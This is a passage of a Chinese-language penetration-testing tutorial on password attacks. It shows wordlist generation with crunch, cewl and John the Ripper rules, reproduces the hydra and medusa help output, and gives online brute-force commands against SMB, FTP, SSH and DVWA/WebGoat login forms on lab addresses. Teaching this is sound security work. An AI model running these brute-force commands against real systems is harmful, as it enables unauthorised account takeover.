+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817145654522-540299160.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 -d 2@ -t @@@%%  </span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>-d 2@ 排除aaa …,bbb…,……</strong></li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220817145935302-899794205.png" /></p>
+<h4 id="组合应用">（9）组合应用</h4>
+<p><strong>边生成字典，便破解WiFi【避免生成大量的字典占用磁盘空间，但破解显然用时更长】</strong></p>
+<p><strong>示例1</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 2 4 0123456789 | aircrack ng a.cap -e MyESSID -w -</span><br></pre></td></tr></table></figure>
+<p><strong>示例2</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 12345 --stdout airolib-ng testdb -import passwd -</span><br></pre></td></tr></table></figure>
+<h3 id="cupp-介绍个人信息专属字典">3、CUPP 介绍【个人信息专属字典】</h3>
+<p>按照个人信息 <strong>生成专属密码字典，具体参见：<a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/15568887.html"
+class="uri">https://www.cnblogs.com/z9m8r8/articles/15568887.html</a></strong></p>
+<h3 id="cewl-介绍网站">4、cewl 介绍【网站】</h3>
+<p>通过收集网站信息生成字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl www.baidu.com -m 3 -d 3 -e -c -v -w 2.txt</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-m：最小单词长度</li>
+<li>-d：爬网深度</li>
+<li>-e：收集包含email地址信息</li>
+<li>-c：每个单词出现次数</li>
+<li>-v：显示详细信息</li>
+<li>支持基本、摘要身份认证</li>
+<li>支持代理</li>
+</ul>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820170801385-335167872.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820170850333-1876927139.png" /></p>
+<h3 id="johnjtr基于自定义规则">5、John/JTR【基于自定义规则】</h3>
+<p>使用John the Ripper配置文件实现密码动态变型，
+<strong>配置文件：/etc/john/john.conf</strong></p>
+<h4
+id="在默认的list.ruleswordlist-后自定义规则">（1）在默认的[List.Rules:Wordlist]
+后自定义规则</h4>
+<p>示例：<span class="math inline">\([0-9]\)</span>[a-z]$[0-9]</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174006541-176023727.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=pass.list --rules  --stdout &gt; m.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174156409-378754844.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174257304-981650712.png" /></p>
+<h4 id="新建自己的规则集">（2）新建自己的规则集</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:<span class="built_in">test</span>]</span><br><span class="line">$[0-3]$[a-e]$[0-5]</span><br><span class="line">$[a-z]$[~!@<span class="comment">#$%^ &amp;*()\- =+]</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820174743298-1708736194.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=pass.list --rules=<span class="built_in">test</span>  --stdout &gt; m.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820175036731-1745670775.png" /></p>
+<h2 id="在线密码破解">3. 在线密码破解</h2>
+<h3 id="hydra-介绍">1、hydra 介绍</h3>
+<ul>
+<li><strong>Help</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -R        restore a previous aborted/crashed session</span><br><span class="line">  -I        ignore an existing restore file (don<span class="string">&#x27;t wait 10 seconds)</span></span><br><span class="line"><span class="string">  -S        perform an SSL connect</span></span><br><span class="line"><span class="string">  -s PORT   if the service is on a different default port, define it here</span></span><br><span class="line"><span class="string">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span></span><br><span class="line"><span class="string">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span></span><br><span class="line"><span class="string">  -x MIN:MAX:CHARSET  password bruteforce generation, type &quot;-x -h&quot; to get help</span></span><br><span class="line"><span class="string">  -y        disable use of symbols in bruteforce, see above</span></span><br><span class="line"><span class="string">  -r        use a non-random shuffling method for option -x</span></span><br><span class="line"><span class="string">  -e nsr    try &quot;n&quot; null password, &quot;s&quot; login as pass and/or &quot;r&quot; reversed login</span></span><br><span class="line"><span class="string">  -u        loop around users, not passwords (effective! implied with -x)</span></span><br><span class="line"><span class="string">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span></span><br><span class="line"><span class="string">  -M FILE   list of servers to attack, one entry per line, &#x27;</span>:<span class="string">&#x27; to specify port</span></span><br><span class="line"><span class="string">  -o FILE   write found login/password pairs to FILE instead of stdout</span></span><br><span class="line"><span class="string">  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1</span></span><br><span class="line"><span class="string">  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)</span></span><br><span class="line"><span class="string">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span></span><br><span class="line"><span class="string">  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)</span></span><br><span class="line"><span class="string">  -w / -W TIME  wait time for a response (32) / between connects per thread (0)</span></span><br><span class="line"><span class="string">  -c TIME   wait time per login attempt over all threads (enforces -t 1)</span></span><br><span class="line"><span class="string">  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)</span></span><br><span class="line"><span class="string">  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode </span></span><br><span class="line"><span class="string">  -O        use old SSL v2 and v3</span></span><br><span class="line"><span class="string">  -K        do not redo failed attempts (good for -M mass scanning)</span></span><br><span class="line"><span class="string">  -q        do not print messages about connection errors</span></span><br><span class="line"><span class="string">  -U        service module usage details</span></span><br><span class="line"><span class="string">  -m OPT    options specific for a module, see -U output for information</span></span><br><span class="line"><span class="string">  -h        more command line options (COMPLETE HELP)</span></span><br><span class="line"><span class="string">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span></span><br><span class="line"><span class="string">  service   the service to crack (see below for supported protocols)</span></span><br><span class="line"><span class="string">  OPT       some service modules support additional input (-U for module help)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hydra is a tool to guess/crack valid login/password pairs.</span></span><br><span class="line"><span class="string">Licensed under AGPL v3.0. The newest version is always available at;</span></span><br><span class="line"><span class="string">https://github.com/vanhauser-thc/thc-hydra</span></span><br><span class="line"><span class="string">Please don&#x27;</span>t use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people <span class="keyword">do</span> not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">These services were not compiled <span class="keyword">in</span>: afp ncp oracle sapr3 smb2.</span><br><span class="line"></span><br><span class="line">Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables <span class="keyword">for</span> a proxy setup.</span><br><span class="line">E.g. % <span class="built_in">export</span> HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)</span><br><span class="line">     % <span class="built_in">export</span> HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)</span><br><span class="line">     % <span class="built_in">export</span> HYDRA_PROXY_HTTP=http://login:pass@proxy:8080</span><br><span class="line">     % <span class="built_in">export</span> HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line">  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line">  hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line">  hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure>
+<h4 id="windowswin2003为例-密码破解">（1）windows【win2003为例】
+密码破解</h4>
+<ul>
+<li><strong>smb 破解</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P password.lst  smb://10.10.10.130/admin$ -vV</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820202948057-946805752.png" /></p>
+<ul>
+<li><strong>ftp 破解</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P password.lst ftp://10.10.10.130   -vV </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820203152839-1758820491.png" /></p>
+<h4 id="linux-密码破解">（2）Linux 密码破解</h4>
+<ul>
+<li><strong>SSH 破解</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P password.lst ssh://10.10.10.134 -e nsr  -t 4 -vV    <span class="comment">#-t指定并发连接数，hydra不稳定，建议小点</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820210334225-371749323.png" /></p>
+<ul>
+<li><strong>其它破解类似</strong></li>
+</ul>
+<h4 id="图形界面-xhydra">（3）图形界面 xhydra</h4>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820211909341-1805899549.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820212016572-1484800408.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820212212820-1853251876.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220820212256052-1375854346.png" /></p>
+<h4
+id="http表单身份认证dvwa靶机破解为例">（4）HTTP表单身份认证【DVWA靶机破解为例】</h4>
+<ul>
+<li><strong>以登陆失败返回的特征字符串作为 继续破解的标志</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P password.lst 10.10.10.134  http-post-form <span class="string">&quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login failed&quot;</span> -V</span><br></pre></td></tr></table></figure>
+<p><strong>注，Login
+failed是登陆失败返回的特征字符串，具体用POST还是GET提交，可以如下图先测试下</strong></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822142328431-1028410094.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822142000005-41395763.png" /></p>
+<ul>
+<li><strong>以登陆成功返回的特征字符串作为 停止破解的标志</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P password.lst 10.10.10.134  http-post-form <span class="string">&quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot;</span> -V</span><br></pre></td></tr></table></figure>
+<p><strong>注，S=index.php是正确登录后的界面</strong></p>
+<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822142626617-1109006011.png" /></strong></p>
+<ul>
+<li><strong>补充</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…………/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo:Foo</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>-C：先访问指定页面取得cookie【也就是说如果需要检查cookie，则可以先到其他页面获取个可用的cookie】</strong></li>
+<li><strong>-H：指定http头【即指定所发包的包头信息】</strong></li>
+<li><strong>支持的请求方式：https- post form、http-get form、https- get
+form</strong></li>
+<li><strong>-S：使用SSL连接</strong></li>
+</ul>
+<h4 id="pw-inspector字典筛选工具">（5）pw-inspector【字典筛选工具】</h4>
+<p>按长度和字符集筛选字典</p>
+<ul>
+<li><strong>用法</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+Syntax: pw-inspector [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p -s</span><br><span class="line">+</span><br><span class="line">+Options:</span><br><span class="line">+  -i FILE    file to <span class="built_in">read</span> passwords from (default: stdin)</span><br><span class="line">+  -o FILE    file to write valid passwords to (default: stdout)</span><br><span class="line">+  -m MINLEN  minimum length of a valid password</span><br><span class="line">+  -M MAXLEN  maximum length of a valid password</span><br><span class="line">+  -c MINSETS the minimum number of sets required (default: all given)</span><br><span class="line">+Sets:</span><br><span class="line">+  -l         lowcase characters (a,b,c,d, etc.)</span><br><span class="line">+  -u         upcase characters (A,B,C,D, etc.)</span><br><span class="line">  -n         numbers (1,2,3,4, etc.)</span><br><span class="line">  -p         printable characters (<span class="built_in">which</span> are not -l/-n/-p, e.g. $,!,/,(,*, etc.)</span><br><span class="line">  -s         special characters - all others not within the sets above</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>示例：</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pw-inspector -i 1.txt -o 2.txt -l     <span class="comment">#过滤小写字母的密码</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822172740061-862979314.png" /></p>
+<h4 id="密码破解效率">（6）密码破解效率</h4>
+<ul>
+<li>密码复杂度(字典命中率)</li>
+<li>带宽、协议、服务器性能、客户端性能</li>
+<li>锁定阈值</li>
+<li>单位时间最大登陆请求次数</li>
+</ul>
+<h4 id="hydra的缺点">（7）Hydra的缺点</h4>
+<ul>
+<li>稳定性差,程序时常崩溃</li>
+<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
+<li>每主机新建进程，每服务 新建实例</li>
+<li>一大量目标破解时性能差</li>
+</ul>
+<h3 id="medusa-介绍">2、Medusa 介绍</h3>
+<h4 id="medusa-的特点">（1）Medusa 的特点</h4>
+<ul>
+<li>稳定性好</li>
+<li>速度控制得当</li>
+<li>基于线程</li>
+<li>支持模块少于hydra (不支持RDP )</li>
+<li>WEB- Form支持存在缺陷</li>
+</ul>
+<h4 id="支持的破解模块">（2）支持的破解模块</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># medusa -d </span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">  Available modules <span class="keyword">in</span> <span class="string">&quot;.&quot;</span> :</span><br><span class="line"></span><br><span class="line">  Available modules <span class="keyword">in</span> <span class="string">&quot;/usr/lib/x86_64-linux-gnu/medusa/modules&quot;</span> :</span><br><span class="line">    + cvs.mod : Brute force module <span class="keyword">for</span> CVS sessions : version 2.0</span><br><span class="line">    + ftp.mod : Brute force module <span class="keyword">for</span> FTP/FTPS sessions : version 2.1</span><br><span class="line">    + http.mod : Brute force module <span class="keyword">for</span> HTTP : version 2.1</span><br><span class="line">    + imap.mod : Brute force module <span class="keyword">for</span> IMAP sessions : version 2.0</span><br><span class="line">    + mssql.mod : Brute force module <span class="keyword">for</span> M$-SQL sessions : version 2.0</span><br><span class="line">    + mysql.mod : Brute force module <span class="keyword">for</span> MySQL sessions : version 2.0</span><br><span class="line">    + nntp.mod : Brute force module <span class="keyword">for</span> NNTP sessions : version 2.0</span><br><span class="line">    + pcanywhere.mod : Brute force module <span class="keyword">for</span> PcAnywhere sessions : version 2.0</span><br><span class="line">    + pop3.mod : Brute force module <span class="keyword">for</span> POP3 sessions : version 2.0</span><br><span class="line">    + postgres.mod : Brute force module <span class="keyword">for</span> PostgreSQL sessions : version 2.0</span><br><span class="line">    + rexec.mod : Brute force module <span class="keyword">for</span> REXEC sessions : version 2.0</span><br><span class="line">    + rlogin.mod : Brute force module <span class="keyword">for</span> RLOGIN sessions : version 2.0</span><br><span class="line">    + rsh.mod : Brute force module <span class="keyword">for</span> RSH sessions : version 2.0</span><br><span class="line">    + smbnt.mod : Brute force module <span class="keyword">for</span> SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.1</span><br><span class="line">    + smtp-vrfy.mod : Brute force module <span class="keyword">for</span> verifying SMTP accounts (VRFY/EXPN/RCPT TO) : version 2.1</span><br><span class="line">    + smtp.mod : Brute force module <span class="keyword">for</span> SMTP Authentication with TLS : version 2.0</span><br><span class="line">    + snmp.mod : Brute force module <span class="keyword">for</span> SNMP Community Strings : version 2.1</span><br><span class="line">    + ssh.mod : Brute force module <span class="keyword">for</span> SSH v2 sessions : version 2.1</span><br><span class="line">    + svn.mod : Brute force module <span class="keyword">for</span> Subversion sessions : version 2.1</span><br><span class="line">    + telnet.mod : Brute force module <span class="keyword">for</span> telnet sessions : version 2.0</span><br><span class="line">    + vmauthd.mod : Brute force module <span class="keyword">for</span> the VMware Authentication Daemon : version 2.0</span><br><span class="line">    + vnc.mod : Brute force module <span class="keyword">for</span> VNC sessions : version 2.1</span><br><span class="line">    + web-form.mod : Brute force module <span class="keyword">for</span> web forms : version 2.1</span><br><span class="line">    + wrapper.mod : Generic Wrapper Module : version 2.0</span><br></pre></td></tr></table></figure>
+<h4 id="基本用法">（3）基本用法</h4>
+<ul>
+<li><strong>help</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># medusa -help</span></span><br><span class="line">Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;</span><br><span class="line"></span><br><span class="line">ALERT: User logon information must be supplied.</span><br><span class="line"></span><br><span class="line">Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]</span><br><span class="line">  -h [TEXT]    : Target hostname or IP address</span><br><span class="line">  -H [FILE]    : File containing target hostnames or IP addresses</span><br><span class="line">  -u [TEXT]    : Username to <span class="built_in">test</span></span><br><span class="line">  -U [FILE]    : File containing usernames to <span class="built_in">test</span></span><br><span class="line">  -p [TEXT]    : Password to <span class="built_in">test</span></span><br><span class="line">  -P [FILE]    : File containing passwords to <span class="built_in">test</span></span><br><span class="line">  -C [FILE]    : File containing combo entries. See README <span class="keyword">for</span> more information.</span><br><span class="line">  -O [FILE]    : File to append <span class="built_in">log</span> information to</span><br><span class="line">  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)</span><br><span class="line">  -M [TEXT]    : Name of the module to execute (without the .mod extension)</span><br><span class="line">  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple <span class="built_in">times</span> with a different parameter each time and they will all be sent to the module (i.e. -m Param1 -m Param2, etc.)</span><br><span class="line">  -d           : Dump all known modules</span><br><span class="line">  -n [NUM]     : Use <span class="keyword">for</span> non-default TCP port number</span><br><span class="line">  -s           : Enable SSL</span><br><span class="line">  -g [NUM]     : Give up after trying to connect <span class="keyword">for</span> NUM seconds (default 3)</span><br><span class="line">  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)</span><br><span class="line">  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.</span><br><span class="line">  -c [NUM]     : Time to <span class="built_in">wait</span> <span class="keyword">in</span> usec to verify socket is available (default 500 usec).</span><br><span class="line">  -t [NUM]     : Total number of logins to be tested concurrently</span><br><span class="line">  -T [NUM]     : Total number of hosts to be tested concurrently</span><br><span class="line">  -L           : Parallelize logins using one username per thread. The default is to process the entire username before proceeding.</span><br><span class="line">  -f           : Stop scanning host after first valid username/password found.</span><br><span class="line">  -F           : Stop audit after first valid username/password found on any host.</span><br><span class="line">  -b           : Suppress startup banner</span><br><span class="line">  -q           : Display module<span class="string">&#x27;s usage information</span></span><br><span class="line"><span class="string">  -v [NUM]     : Verbose level [0 - 6 (more)]</span></span><br><span class="line"><span class="string">  -w [NUM]     : Error debug level [0 - 10 (more)]</span></span><br><span class="line"><span class="string">  -V           : Display version</span></span><br><span class="line"><span class="string">  -Z [TEXT]    : Resume scan based on map of previous scan</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>常用参数</strong></li>
+<li><strong>-e：同hydra</strong></li>
+<li><strong>-F：破解到第一个就停止</strong></li>
+<li><strong>-n：非默认端口</strong></li>
+<li><strong>-S：使用SSL连接</strong></li>
+<li><strong>-T：并发主机数</strong></li>
+<li><strong>medusa -M xxx
+-q：查看xxx模块所需具体参数，并用-m指定</strong></li>
+</ul>
+<h4 id="windows-密码破解文件共享为例">（4）Windows
+密码破解【文件共享为例】</h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M smbnt -h 10.10.10.130 -u administrator -P password.lst -e ns -F</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822175158151-232618665.png" /></p>
+<h4 id="linux-密码破解ssh服务为例"><strong>（5）Linux
+密码破解【SSH服务为例】</strong></h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 10.10.10.134 -u root -P password.lst -e ns -F</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822175815507-948175627.png" /></p>
+<h4 id="网站访问破解owasp-webgoat为例">（6）网站访问破解【OWASP
+<strong>WebGoat为例】</strong></h4>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822200830911-935576982.png" /></p>
+<p><strong>破解</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 10.10.10.134  -u guest -P password.lst -M http -m DIR:<span class="string">&quot;/WebGoat/attack&quot;</span> </span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822201247069-2083392879.png" /></p>
+<h4 id="http-登录表单破解-dvwa靶机破解为例"><strong>（7）HTTP
+登录表单破解【</strong> <strong>DVWA靶机破解为例】</strong></h4>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 10.10.10.134  -u admin -P password.lst -M web-form -m FORM:<span class="string">&quot;dvwa/login.php&quot;</span> -m DENY-SIGNAL:<span class="string">&quot;login.php&quot;</span>  -m FORM-DATA:<span class="string">&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220822191947423-964125039.png" /></p>
+<p><strong>注，也就是说发包后，返回200才可继续往下破解尝试</strong></p>
+<h2 id="离线密码破解">4. 离线密码破解</h2>
+<ul>
+<li><strong>身份认证</strong></li>
+<li><strong>禁止明文传输密码</strong></li>
+<li><strong>每次认证使用HASH 算法加密密码传输（ HASH
+算法加密容易、解密困难）</strong></li>
